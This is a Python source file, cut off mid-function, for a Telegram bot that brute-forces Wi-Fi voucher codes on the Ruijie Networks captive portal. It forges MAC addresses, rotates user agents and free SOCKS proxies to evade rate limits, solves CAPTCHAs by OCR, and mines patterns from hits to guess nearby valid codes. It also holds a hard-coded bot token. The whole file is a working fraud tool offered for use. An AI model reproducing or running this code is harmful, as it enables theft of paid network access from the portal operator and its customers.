#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
⚡ RUIJIE HIT-MAX v21 — Optimized High-Speed (Open for Everyone)
✅ Cluster Focus  ✅ Pattern Mining  ✅ Near-Hit Retry
✅ Inline Pre-warm  ✅ Fast Proxy Pool  ✅ Low Overhead Loops
"""

import asyncio, aiohttp, json, random, re, os, time, ssl
import string, uuid, sqlite3, logging, threading, csv, gc
from concurrent.futures import ThreadPoolExecutor
from contextlib import contextmanager
from datetime import datetime, timedelta, timezone
from collections import defaultdict, deque, Counter

from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web

try:
    from aiohttp_socks import ProxyConnector
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

try:
    from bitarray import bitarray
    BITARRAY_OK = True
except ImportError:
    BITARRAY_OK = False

try:
    import cv2, ddddocr, numpy as np
    OCR_OK = True
except ImportError:
    OCR_OK = False

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s | %(levelname)-7s | %(message)s')
log = logging.getLogger("v21")

# ══════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════
class CFG:
    BOT_TOKEN = "8946706160:AAFOrkwwtidO_-X4eOQpGUXDsWz1H9qNNCQ"
    ADMIN_IDS = []
    HIT_CHANNEL = ""

    # LANES & WORKERS
    LANES            = 300          
    SID_MAX_REQ      = 45          
    SID_MIN_AGE      = 25          
    CAPTCHA_PER_LANE = 4

    MAX_SPEED_CPM    = 0
    BATCH_SIZE       = 5000
    DASH_INTERVAL    = 2.0
    RATE_BACKOFF     = 0.2         

    HTTP_TIMEOUT     = 4
    HTTP_CONNECT     = 2
    KEEPALIVE        = 120
    DNS_CACHE        = 3600

    OCR_POOL         = 6
    OCR_THREADS      = 16           
    OCR_MIN_LEN      = 4
    OCR_MAX_LEN      = 6

    PROXY_FILE       = "proxies.txt"
    MAX_PROXIES      = 20000
    DB_FILE          = "ruijie_v21.db"

    # HIT-MAX FEATURES
    CLUSTER_WINDOW   = 5000
    CLUSTER_MIN_HITS = 3
    NEAR_HIT_RANGE   = 500
    PATTERN_MIN_HITS = 5

    JITTER_MIN       = 0.0005
    JITTER_MAX       = 0.003

    PORTAL           = "https://portal-as.ruijienetworks.com"
    VOUCHER_URL      = f"{PORTAL}/api/auth/voucher/?lang=en_US"
    CAPTCHA_IMG      = f"{PORTAL}/api/auth/captcha/image"
    CAPTCHA_VRFY     = f"{PORTAL}/api/auth/captcha/verify"
    BALANCE_URLS     = [
        f"{PORTAL}/api/macc2/balance/getBalance/",
        f"{PORTAL}/api/auth/balance/getBalance/",
    ]

    UA = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36"
    ]

    FREE_SOURCES = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    ]

    ALL_PLANS = ["30m","1h","6h","12h","1d","3d","7d","15d",
                 "1m","2m","3m","6m","1y","2y","unlimited"]

# ══════════════════════════════════════════════════════════════════
#  HIT-MAX COMPONENTS
# ══════════════════════════════════════════════════════════════════
class ClusterDetector:
    def __init__(self, window=5000, min_hits=3):
        self.hit_codes = []
        self.window = window
        self.min_hits = min_hits
        self.clusters = []
        self.lock = threading.Lock()

    def add_hit(self, code):
        with self.lock:
            try: n = int(code)
            except: return
            self.hit_codes.append(n)
            self._recompute()

    def _recompute(self):
        if len(self.hit_codes) < self.min_hits: return
        nums = sorted(set(self.hit_codes))
        clusters = []
        i = 0
        while i < len(nums):
            j = i
            while (j + 1 < len(nums) and nums[j+1] - nums[i] <= self.window):
                j += 1
            if j - i + 1 >= self.min_hits:
                clusters.append((nums[i], nums[j], j - i + 1))
            i = j + 1 if j > i else i + 1
        self.clusters = clusters[-5:]

    def get_clusters(self):
        with self.lock: return list(self.clusters)


class NearHitTracker:
    def __init__(self, range_size=500):
        self.range = range_size
        self.hits = deque(maxlen=500)
        self.near = deque(maxlen=10000)
        self.lock = threading.Lock()

    def add_hit(self, code):
        with self.lock:
            try: n = int(code)
            except: return
            self.hits.append(n)
            for off in range(-self.range, self.range + 1):
                if off == 0: continue
                self.near.append(n + off)

    def pick_near(self):
        with self.lock:
            if not self.near: return None
            return str(self.near.pop()).zfill(6)

    def has_near(self):
        with self.lock: return len(self.near) > 0


class PatternMiner:
    def __init__(self, min_hits=5):
        self.hits = []
        self.min_hits = min_hits
        self.digit_freq = defaultdict(Counter)
        self.prefixes = Counter()
        self.suffixes = Counter()

    def add_hit(self, code):
        self.hits.append(code)
        for i, d in enumerate(code):
            self.digit_freq[i][d] += 1
        if len(code) >= 2:
            self.prefixes[code[:2]] += 1
            self.suffixes[code[-2:]] += 1

    def get_biased_code(self, length=6):
        if len(self.hits) < self.min_hits: return None
        chars = []
        for i in range(length):
            freq = self.digit_freq.get(i, Counter())
            if freq and random.random() < 0.7:
                chars.append(random.choices(list(freq.keys()), weights=list(freq.values()))[0])
            else:
                chars.append(random.choice(string.digits))
        return ''.join(chars)

    def summary(self):
        if len(self.hits) < self.min_hits: return None
        return {"prefixes": self.prefixes.most_common(3),
                "suffixes": self.suffixes.most_common(3),
                "hits": len(self.hits)}


class HitLock:
    def __init__(self):
        self.seen = set()
        self.lock = asyncio.Lock()

    async def claim(self, code):
        async with self.lock:
            if code in self.seen: return False
            self.seen.add(code)
            return True


class CodeQueue:
    def __init__(self, codegen, size=200_000):
        self.q = asyncio.Queue(maxsize=size)
        self.priority_q = asyncio.Queue(maxsize=10000)
        self.codegen = codegen
        self.near_hit = None
        self.pattern_miner = None
        self.running = False
        self.task = None

    def _is_eng_mixed(self):
        m = self.codegen.mode
        return (m.startswith("mix") or m.startswith("low")
                or (self.codegen._n_letters > 0 and self.codegen._case_mode == 'l'))

    async def producer(self):
        loop = asyncio.get_event_loop()
        while self.running:
            try:
                if self.q.qsize() > self.q.maxsize * 0.8:
                    await asyncio.sleep(0.02)
                    continue
                batch = await loop.run_in_executor(None, self._gen_batch, 5000)
                for c in batch:
                    if not self.running: return
                    try: self.q.put_nowait(c)
                    except asyncio.QueueFull: break
            except asyncio.CancelledError: return
            except Exception as e:
                await asyncio.sleep(0.1)

    def _gen_batch(self, n):
        if self._is_eng_mixed():
            m = self.codegen.mode
            if m in ("mix6", "low6"): L = 6
            elif m in ("mix7", "low7"): L = 7
            elif m in ("mix8", "low8"): L = 8
            elif m in ("mix9", "low9"): L = 9
            else: L = self.codegen._n_letters + self.codegen._n_numbers

            charset = (string.ascii_lowercase if m.startswith("low")
                       else string.ascii_lowercase + string.digits)
            return [''.join(random.choices(charset, k=L)) for _ in range(n)]

        out = []
        for _ in range(n):
            r = random.random()
            if r < 0.3 and self.near_hit and self.near_hit.has_near():
                c = self.near_hit.pick_near()
                if c: out.append(c); continue
            if r < 0.6 and self.pattern_miner:
                c = self.pattern_miner.get_biased_code(6)
                if c: out.append(c); continue
            out.append(self.codegen.next())
        return out

    async def get(self):
        try: return self.priority_q.get_nowait()
        except asyncio.QueueEmpty: pass
        return await self.q.get()

    async def push_priority(self, code):
        try: self.priority_q.put_nowait(code)
        except asyncio.QueueFull: pass

    async def start(self):
        self.running = True
        self.task = asyncio.create_task(self.producer())

    async def stop(self):
        self.running = False
        if self.task:
            self.task.cancel()
            try: await self.task
            except: pass

# ══════════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════════
class DB:
    @contextmanager
    def cur(self):
        c = sqlite3.connect(CFG.DB_FILE, timeout=30, check_same_thread=False)
        c.execute("PRAGMA journal_mode=WAL")
        c.execute("PRAGMA synchronous=NORMAL")
        c.row_factory = sqlite3.Row
        try:
            yield c.cursor(); c.commit()
        finally: c.close()

    def init(self):
        with self.cur() as c:
            c.execute("""CREATE TABLE IF NOT EXISTS keys(
                k TEXT PRIMARY KEY, uid TEXT, plan TEXT, exp TEXT,
                limit_n INTEGER DEFAULT 999999, used INTEGER DEFAULT 0)""")
            c.execute("""CREATE TABLE IF NOT EXISTS users(
                uid TEXT PRIMARY KEY, k TEXT, reg TEXT)""")
            c.execute("""CREATE TABLE IF NOT EXISTS results(
                uid TEXT PRIMARY KEY, data TEXT)""")
            c.execute("""CREATE TABLE IF NOT EXISTS settings(
                uid TEXT PRIMARY KEY, conn_mode TEXT DEFAULT 'direct',
                mode TEXT DEFAULT '6', notif INTEGER DEFAULT 1)""")
            c.execute("""CREATE TABLE IF NOT EXISTS history(
                id INTEGER PRIMARY KEY AUTOINCREMENT, uid TEXT, mode TEXT,
                hits INTEGER, tried INTEGER, elapsed REAL, ts REAL)""")
            c.execute("""CREATE TABLE IF NOT EXISTS bot_users(
                uid TEXT PRIMARY KEY, username TEXT, first_name TEXT,
                joined_at TEXT, last_seen TEXT, is_banned INTEGER DEFAULT 0)""")

    def k_get(self, k):
        with self.cur() as c:
            c.execute("SELECT * FROM keys WHERE k=?", (k,))
            r = c.fetchone(); return dict(r) if r else None
    def k_add(self, k, uid, plan, exp, lim):
        with self.cur() as c:
            c.execute("""INSERT OR REPLACE INTO keys
                (k,uid,plan,exp,limit_n,used) VALUES(?,?,?,?,?,0)""", (k, uid, plan, exp, lim))
    def k_del(self, k):
        with self.cur() as c: c.execute("DELETE FROM keys WHERE k=?", (k,))
    def k_all(self):
        with self.cur() as c:
            c.execute("SELECT * FROM keys")
            return {r["k"]: dict(r) for r in c.fetchall()}
    def k_inc(self, k):
        with self.cur() as c:
            c.execute("UPDATE keys SET used=used+1 WHERE k=?", (k,))

    def u_get(self, uid):
        with self.cur() as c:
            c.execute("SELECT * FROM users WHERE uid=?", (uid,))
            r = c.fetchone(); return dict(r) if r else None
    def u_add(self, uid, k):
        with self.cur() as c:
            c.execute("INSERT OR REPLACE INTO users(uid,k,reg) VALUES(?,?,?)",
                (uid, k, datetime.now(timezone.utc).isoformat()))
    def u_all(self):
        with self.cur() as c:
            c.execute("SELECT uid FROM users")
            return [r[0] for r in c.fetchall()]

    def r_get(self, uid):
        with self.cur() as c:
            c.execute("SELECT data FROM results WHERE uid=?", (uid,))
            r = c.fetchone()
            if not r: return []
            data = json.loads(r[0])
            return [it if isinstance(it, dict)
                    else {"code": str(it), "plan": "—", "time": "—", "found_at": "—"}
                    for it in data]
    def r_save(self, uid, data):
        with self.cur() as c:
            c.execute("INSERT OR REPLACE INTO results(uid,data) VALUES(?,?)", (uid, json.dumps(data)))

    def s_get(self, uid):
        with self.cur() as c:
            c.execute("SELECT * FROM settings WHERE uid=?", (uid,))
            r = c.fetchone()
            if r: return dict(r)
        return {"conn_mode": "direct", "mode": "6", "notif": 1}
    def s_put(self, uid, **kw):
        cur = self.s_get(uid); cur.update(kw)
        with self.cur() as c:
            c.execute("""INSERT OR REPLACE INTO settings
                (uid,conn_mode,mode,notif) VALUES(?,?,?,?)""",
                (uid, cur.get("conn_mode","direct"), cur.get("mode","6"), cur.get("notif",1)))

    def h_add(self, uid, mode, hits, tried, el):
        with self.cur() as c:
            c.execute("""INSERT INTO history(uid,mode,hits,tried,elapsed,ts)
                VALUES(?,?,?,?,?,?)""", (uid, mode, hits, tried, el, time.time()))
    def h_get(self, uid, n=10):
        with self.cur() as c:
            c.execute("SELECT * FROM history WHERE uid=? ORDER BY ts DESC LIMIT ?", (uid, n))
            return [dict(r) for r in c.fetchall()]
    def h_top(self, n=10):
        with self.cur() as c:
            c.execute("""SELECT uid, SUM(hits) as total FROM history
                GROUP BY uid ORDER BY total DESC LIMIT ?""", (n,))
            return [dict(r) for r in c.fetchall()]

    def bu_register(self, uid, username, first_name):
        with self.cur() as c:
            c.execute("SELECT uid FROM bot_users WHERE uid=?", (uid,))
            now = datetime.now(timezone.utc).isoformat()
            if c.fetchone():
                c.execute("""UPDATE bot_users SET username=?, first_name=?, last_seen=? WHERE uid=?""",
                    (username, first_name, now, uid))
            else:
                c.execute("""INSERT INTO bot_users (uid,username,first_name,joined_at,last_seen,is_banned)
                    VALUES(?,?,?,?,?,0)""", (uid, username, first_name, now, now))
    def bu_all(self):
        with self.cur() as c:
            c.execute("SELECT * FROM bot_users ORDER BY last_seen DESC")
            return [dict(r) for r in c.fetchall()]
    def bu_is_banned(self, uid):
        with self.cur() as c:
            c.execute("SELECT is_banned FROM bot_users WHERE uid=?", (uid,))
            r = c.fetchone()
            return bool(r[0]) if r else False

DBX = DB(); DBX.init()

# ══════════════════════════════════════════════════════════════════
#  KEY HELPERS
# ══════════════════════════════════════════════════════════════════
def key_exp(plan):
    m = {"30m":30,"1h":60,"6h":360,"12h":720,"1d":1440,"3d":4320,
         "7d":10080,"15d":21600,"1m":43200,"2m":86400,"3m":129600,
         "6m":259200,"1y":525600,"2y":1051200}
    if plan in ("unlimited","unlimit"): return "9999-12-31T23:59:59Z"
    if plan not in m: return None
    return (datetime.now(timezone.utc) + timedelta(minutes=m[plan])).isoformat()

def key_ok(exp):
    if not exp: return False
    if exp == "9999-12-31T23:59:59Z": return True
    try: return datetime.now(timezone.utc) < datetime.fromisoformat(exp.replace("Z","+00:00"))
    except: return False

def key_gen(n=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))

def is_admin(uid): return True
def is_paid(uid): return True

def plan_label(plan):
    m = {"30m":"၃၀ မိနစ်","1h":"၁ နာရီ","6h":"၆ နာရီ","12h":"၁၂ နာရီ",
         "1d":"၁ ရက်","3d":"၃ ရက်","7d":"၇ ရက်","15d":"၁၅ ရက်",
         "1m":"၁ လ","2m":"၂ လ","3m":"၃ လ","6m":"၆ လ",
         "1y":"၁ နှစ်","2y":"၂ နှစ်","unlimited":"♾️"}
    return m.get(plan, plan)

# ══════════════════════════════════════════════════════════════════
#  FAST PROXY POOL
# ══════════════════════════════════════════════════════════════════
class ProxyPool:
    def __init__(self):
        self.pool = []
        self.bad = set()
        self.working = []
        self.idx = 0
        self.fetching = False
        self._load()

    def _norm(self, p):
        p = (p or "").strip()
        if not p or p.startswith("#"): return None
        if not p.startswith(("http://","https://","socks4://","socks5://")):
            p = "socks5://" + p
        return p

    def _load(self):
        if not os.path.exists(CFG.PROXY_FILE):
            open(CFG.PROXY_FILE, "w").close(); return
        with open(CFG.PROXY_FILE) as f:
            raw = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        self.pool = [p for p in (self._norm(x) for x in raw) if p]
        random.shuffle(self.pool)

    def _save(self):
        try:
            with open(CFG.PROXY_FILE, "w") as f:
                f.write("\n".join(self.pool))
        except: pass

    async def fetch(self):
        if self.fetching: return 0
        self.fetching = True
        try:
            found = set()
            hdr = {"User-Agent": random.choice(CFG.UA)}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as s:
                for src in CFG.FREE_SOURCES:
                    try:
                        async with s.get(src, headers=hdr, ssl=False) as r:
                            if r.status != 200: continue
                            txt = await r.text()
                            for ln in txt.splitlines():
                                ln = ln.strip()
                                if re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$", ln):
                                    found.add("socks5://" + ln)
                    except: continue
            merged = set(self.pool) - self.bad
            for p in found:
                n = self._norm(p)
                if n: merged.add(n)
            self.pool = list(merged)[:CFG.MAX_PROXIES]
            self._save()
            return len(self.pool)
        finally: self.fetching = False

    def need(self):
        return len(self.working) < 100 or len(self.pool) < 2000

    async def get(self):
        if self.working and random.random() < 0.85:
            return random.choice(self.working)
        if not self.pool: return None
        self.idx = (self.idx + 1) % len(self.pool)
        p = self.pool[self.idx]
        return p if p not in self.bad else None

    async def ok(self, p):
        if not p: return
        if p not in self.working:
            self.working.append(p)
            if len(self.working) > 300: self.working.pop(0)
        self.bad.discard(p)

    async def bad_(self, p):
        if not p: return
        self.bad.add(p)
        try: self.working.remove(p)
        except: pass

    def stats(self): return len(self.pool), len(self.bad), len(self.working)

    def add_many(self, lines):
        added = 0
        for ln in lines:
            n = self._norm(ln)
            if n and n not in self.pool:
                self.pool.append(n); added += 1
        if added: self._save()
        return added

_pool = None
def pool():
    global _pool
    if _pool is None: _pool = ProxyPool()
    return _pool

def mk_conn(p):
    if not p or not SOCKS_OK: return None
    try:
        if p.startswith(("socks4://","socks5://")):
            return ProxyConnector.from_url(p, rdns=True)
    except: pass
    return None

# ══════════════════════════════════════════════════════════════════
#  OPTIMIZED OCR
# ══════════════════════════════════════════════════════════════════
class OCR:
    def __init__(self):
        self.p = []
        self.idx = 0
        self.lock = threading.Lock()
        self.ex = ThreadPoolExecutor(max_workers=CFG.OCR_THREADS)
        if OCR_OK:
            for _ in range(CFG.OCR_POOL):
                try: self.p.append(ddddocr.DdddOcr(show_ad=False))
                except: pass

    def _sync(self, img):
        try:
            if not self.p: return None
            with self.lock:
                o = self.p[self.idx % len(self.p)]; self.idx += 1
            arr = np.frombuffer(img, np.uint8)
            im = cv2.imdecode(arr, cv2.IMREAD_GRAYSCALE)
            if im is None: return None
            _, th = cv2.threshold(im, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
            _, buf = cv2.imencode('.png', th)
            r = o.classification(buf.tobytes())
            if not r: return None
            r = r.upper().strip()
            if len(r) < CFG.OCR_MIN_LEN or len(r) > CFG.OCR_MAX_LEN: return None
            if not r.isalnum(): return None
            return r
        except: return None

    async def run(self, img):
        return await asyncio.get_event_loop().run_in_executor(self.ex, self._sync, img)

OCR_POOL = OCR()

# ══════════════════════════════════════════════════════════════════
#  RATE GUARD
# ══════════════════════════════════════════════════════════════════
class RateLimitGuard:
    def __init__(self, threshold=100, window=10, cooldown=10):
        self.errors = deque(maxlen=250)
        self.threshold = threshold
        self.window = window
        self.cooldown = cooldown
        self.paused_until = 0

    def record(self):
        self.errors.append(time.time())

    def is_paused(self):
        return time.time() < self.paused_until

    async def check(self):
        now = time.time()
        if now < self.paused_until:
            await asyncio.sleep(min(self.paused_until - now, 0.5))
            return
        recent = [t for t in self.errors if now - t < self.window]
        if len(recent) >= self.threshold:
            self.paused_until = now + self.cooldown

GUARD = RateLimitGuard()

# ══════════════════════════════════════════════════════════════════
#  SESSION
# ══════════════════════════════════════════════════════════════════
_connector = None

async def init_connector():
    global _connector
    _connector = aiohttp.TCPConnector(
        limit=CFG.LANES * 2,
        limit_per_host=CFG.LANES * 2,
        ttl_dns_cache=CFG.DNS_CACHE,
        keepalive_timeout=CFG.KEEPALIVE,
        force_close=False,
        enable_cleanup_closed=True,
        ssl=False,
    )

def mk_session():
    return aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(
            total=CFG.HTTP_TIMEOUT, connect=CFG.HTTP_CONNECT))

# ══════════════════════════════════════════════════════════════════
#  NETWORK
# ══════════════════════════════════════════════════════════════════
def rand_mac():
    b = random.choice([0x02,0x06,0x0A,0x0E])
    return ':'.join(f'{x:02x}' for x in [b] + [random.randint(0,255) for _ in range(5)])

def swap_mac(url, mac):
    if 'mac=' in url: return re.sub(r'(?<=mac=)[^&]+', mac, url)
    return url

def pick_ua():
    return random.choice(CFG.UA)

async def jitter_delay():
    await asyncio.sleep(random.uniform(CFG.JITTER_MIN, CFG.JITTER_MAX))

async def get_sid(sess, portal, kw=None):
    kw = kw or {}
    url = swap_mac(portal, rand_mac())
    h = {"user-agent": pick_ua(), "accept": "text/html,*/*"}
    try:
        async with sess.get(url, headers=h, allow_redirects=True, ssl=False, **kw) as r:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            if m: return m.group(1)
            body = await r.text()
            m = re.search(r"sessionId[\"']?\s*[:=]\s*[\"']?([a-zA-Z0-9]+)", body)
            return m.group(1) if m else None
    except: return None

async def get_captcha(sess, sid, kw=None):
    kw = kw or {}
    h = {"user-agent": pick_ua(), "accept": "image/*"}
    try:
        async with sess.get(CFG.CAPTCHA_IMG,
            params={"sessionId": sid, "_t": str(time.time())},
            headers=h, ssl=False, **kw) as r:
            if r.status == 200: return await r.read()
    except: pass
    return None

async def verify_captcha(sess, sid, txt, kw=None):
    kw = kw or {}
    h = {"user-agent": pick_ua(), "content-type": "application/json"}
    try:
        async with sess.post(CFG.CAPTCHA_VRFY,
            json={"sessionId": sid, "authCode": txt},
            headers=h, ssl=False, **kw) as r:
            d = await r.json()
            return d.get("success") is True
    except: return False

async def solve_captcha(sess, sid, kw=None):
    for _ in range(2):
        img = await get_captcha(sess, sid, kw)
        if not img: continue
        txt = await OCR_POOL.run(img)
        if not txt: continue
        if await verify_captcha(sess, sid, txt, kw):
            return txt
    return None

async def send_code(sess, sid, auth, code, kw=None):
    kw = kw or {}
    payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth}
    h = {"content-type": "application/json",
         "origin": CFG.PORTAL,
         "referer": f"{CFG.PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
         "user-agent": pick_ua()}
    try:
        async with sess.post(CFG.VOUCHER_URL, json=payload, headers=h, ssl=False, **kw) as r:
            return await r.text()
    except: return None

async def fetch_balance(sess, sid, kw=None):
    kw = kw or {}
    h = {"user-agent": pick_ua(), "accept": "application/json", "x-requested-with": "XMLHttpRequest"}
    for path in CFG.BALANCE_URLS:
        try:
            async with sess.get(f"{path}{sid}", headers=h, ssl=False, **kw) as r:
                if r.status != 200: continue
                try: d = await r.json()
                except: continue
                plan = "Unknown"; tstr = "Unknown"
                for cd in [d] + [d.get(k, {}) for k in ("result","data") if isinstance(d.get(k), dict)]:
                    p = cd.get("profileName") or cd.get("planName")
                    if p and str(p).strip().lower() != "unknown":
                        plan = str(p).strip()
                    for key in ("remainingMinutes","totalMinutes","totalTime","remainMinutes"):
                        v = cd.get(key)
                        if v is not None:
                            try:
                                v = int(float(v))
                                if v > 0:
                                    hh, mm = divmod(v, 60)
                                    tstr = f"{hh}h {mm}m" if hh else f"{mm}m"
                            except: tstr = str(v)
                            break
                    if tstr != "Unknown": break
                return plan, tstr
        except: continue
    return "Unknown", "Unknown"

# ══════════════════════════════════════════════════════════════════
#  CODE GENERATOR
# ══════════════════════════════════════════════════════════════════
class CodeGen:
    def __init__(self, mode):
        self.mode = mode
        self._seen = None
        self._size = 0
        self._n_letters = 0
        self._n_numbers = 0
        self._case_mode = 'l'

        m = re.match(r"mix_(\d+)_(\d+)_([lub])", mode)
        if m:
            self._n_letters = int(m.group(1))
            self._n_numbers = int(m.group(2))
            self._case_mode = m.group(3)
            self._letter_space = 52 if self._case_mode == 'b' else 26
            space = (self._letter_space ** self._n_letters) * (10 ** self._n_numbers)
            if BITARRAY_OK and space <= 200_000_000:
                self._seen = bitarray(space); self._seen.setall(0)
                self._size = space
            return

        if BITARRAY_OK:
            if mode in ("6", "7", "8"):
                size = 10 ** int(mode)
                self._seen = bitarray(size); self._seen.setall(0)
                self._size = size
            elif mode == "9":
                self._seen = bitarray(100_000_000); self._seen.setall(0)
                self._size = 100_000_000

    def _encode_mix(self, idx):
        alpha = (string.ascii_letters if self._case_mode == 'b'
                 else string.ascii_uppercase if self._case_mode == 'u'
                 else string.ascii_lowercase)
        L = self._letter_space
        letters = []
        for _ in range(self._n_letters):
            letters.append(alpha[idx % L]); idx //= L
        numbers = []
        for _ in range(self._n_numbers):
            numbers.append(string.digits[idx % 10]); idx //= 10
        chars = letters + numbers
        random.shuffle(chars)
        return ''.join(chars)

    def _enc(self, n):
        if self._n_letters or self._n_numbers:
            return self._encode_mix(n)
        m = self.mode
        if m in ("6","7","8","9"):
            return str(n).zfill(int(m))
        return str(n).zfill(6)

    def next(self):
        if self._n_letters or self._n_numbers:
            if self._seen is not None:
                for _ in range(30):
                    n = random.randint(0, self._size - 1)
                    if not self._seen[n]:
                        self._seen[n] = 1
                        return self._encode_mix(n)
            alpha = (string.ascii_letters if self._case_mode == 'b'
                     else string.ascii_uppercase if self._case_mode == 'u'
                     else string.ascii_lowercase)
            chars = (random.choices(alpha, k=self._n_letters) +
                     random.choices(string.digits, k=self._n_numbers))
            random.shuffle(chars)
            return ''.join(chars)

        if self._seen is not None:
            for _ in range(30):
                n = random.randint(0, self._size - 1)
                if not self._seen[n]:
                    self._seen[n] = 1
                    return self._enc(n)
            return self._enc(random.randint(0, self._size - 1))

        m = self.mode
        if m.startswith("low"):
            L = int(m.replace("low","")) if len(m) > 3 else 6
            return ''.join(random.choices(string.ascii_lowercase, k=L))
        if m.startswith("mix"):
            L = int(m.replace("mix","")) if len(m) > 3 else 6
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=L))
        return str(random.randint(0, 10**6)).zfill(6)

# ══════════════════════════════════════════════════════════════════
#  LANE
# ══════════════════════════════════════════════════════════════════
class Lane:
    __slots__ = ("id", "sid", "sid_uses", "sid_born", "captchas", "sess", "proxy", "fail_count")

    def __init__(self, lane_id):
        self.id = lane_id
        self.sid = None
        self.sid_uses = 0
        self.sid_born = 0
        self.captchas = deque()
        self.sess = None
        self.proxy = None
        self.fail_count = 0

    def needs_sid(self):
        if self.sid is None: return True
        if self.sid_uses >= CFG.SID_MAX_REQ: return True
        if time.time() - self.sid_born > CFG.SID_MIN_AGE: return True
        return False

# ══════════════════════════════════════════════════════════════════
#  BOT + STATE
# ══════════════════════════════════════════════════════════════════
BOT = AsyncTeleBot(CFG.BOT_TOKEN)
scan_tasks = {}
success_texts = defaultdict(list)
user_portal = {}
user_states = {}
pending_balance = set()
BALANCE_SEM = asyncio.Semaphore(15)

# ══════════════════════════════════════════════════════════════════
#  OPTIMIZED LANE WORKER
# ══════════════════════════════════════════════════════════════════
async def lane_worker(lane, chat_id, portal, codeq, scan_id, stats,
                       cluster, nearhit, patterns, hitlock):
    cfg = DBX.s_get(str(chat_id))
    conn_mode = cfg.get("conn_mode", "direct")
    lane.sess = mk_session()

    try:
        while True:
            st = scan_tasks.get(chat_id)
            if not st or st.get("scan_id") != scan_id or st.get("stop"):
                return

            if GUARD.is_paused():
                await GUARD.check(); continue

            if lane.needs_sid():
                rkw = {}
                if conn_mode == "proxy":
                    if not lane.proxy: lane.proxy = await pool().get()
                    if lane.proxy and not SOCKS_OK: rkw["proxy"] = lane.proxy
                elif conn_mode == "mixed" and random.random() > 0.9:
                    lane.proxy = await pool().get()

                sid = await get_sid(lane.sess, portal, rkw)
                if not sid:
                    if lane.proxy: await pool().bad_(lane.proxy); lane.proxy = None
                    await asyncio.sleep(0.05); continue
                
                lane.sid = sid
                lane.sid_born = time.time()
                lane.sid_uses = 0
                if lane.proxy: await pool().ok(lane.proxy)

            if not lane.captchas:
                rkw = {"proxy": lane.proxy} if lane.proxy else {}
                c = await solve_captcha(lane.sess, lane.sid, rkw)
                if not c:
                    lane.sid = None; continue
                lane.captchas.append(c)

            await jitter_delay()

            code = await codeq.get()
            auth = lane.captchas.popleft()
            rkw = {"proxy": lane.proxy} if lane.proxy else {}

            body = await send_code(lane.sess, lane.sid, auth, code, rkw)

            if body is None:
                lane.fail_count += 1
                if lane.fail_count >= 2:
                    if lane.proxy: await pool().bad_(lane.proxy); lane.proxy = None
                    lane.sid = None; lane.fail_count = 0
                continue

            if lane.proxy: await pool().ok(lane.proxy)
            lane.fail_count = 0
            lane.sid_uses += 1
            stats["checked"] += 1

            low = body.lower()

            if "logonurl" in low or '"sta"' in low or "sta=" in low:
                if not await hitlock.claim(code): continue
                stats["hits"] += 1
                cluster.add_hit(code)
                nearhit.add_hit(code)
                patterns.add_hit(code)

                hit_entry = {
                    "code": code, "plan": "⏳ Fetching...", "time": "",
                    "status": "fetching",
                    "found_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                success_texts[chat_id].append(hit_entry)
                task = asyncio.create_task(_fetch_balance_bg(chat_id, code, lane.sess, lane.sid, rkw))
                pending_balance.add(task)
                task.add_done_callback(pending_balance.discard)

                try:
                    n = int(code)
                    for off in range(-CFG.NEAR_HIT_RANGE, CFG.NEAR_HIT_RANGE + 1):
                        if off == 0: continue
                        await codeq.push_priority(str(n + off).zfill(len(code)))
                except: pass

            elif "request limited" in low or "too many" in low or "limited" in low:
                stats["limits"] += 1
                GUARD.record()
                lane.sid = None
                await asyncio.sleep(CFG.RATE_BACKOFF)

            st["checked"] = stats["checked"]

    except asyncio.CancelledError: return
    except Exception as e: log.debug(f"[Lane {lane.id}] {e}")
    finally:
        if lane.sess:
            try: await lane.sess.close()
            except: pass

async def _fetch_balance_bg(chat_id, code, sess, sid, rkw):
    async with BALANCE_SEM:
        try:
            plan, tstr = await fetch_balance(sess, sid, rkw)
            plan = plan or "Unknown"; tstr = tstr or "Unknown"
            for h in reversed(success_texts.get(chat_id, [])):
                if h.get("code") == code:
                    h["plan"] = plan; h["time"] = tstr
                    h["status"] = "done"; break
            u = DBX.u_get(str(chat_id))
            if u and u.get("k"):
                try: DBX.k_inc(u["k"])
                except: pass
            if CFG.HIT_CHANNEL:
                try:
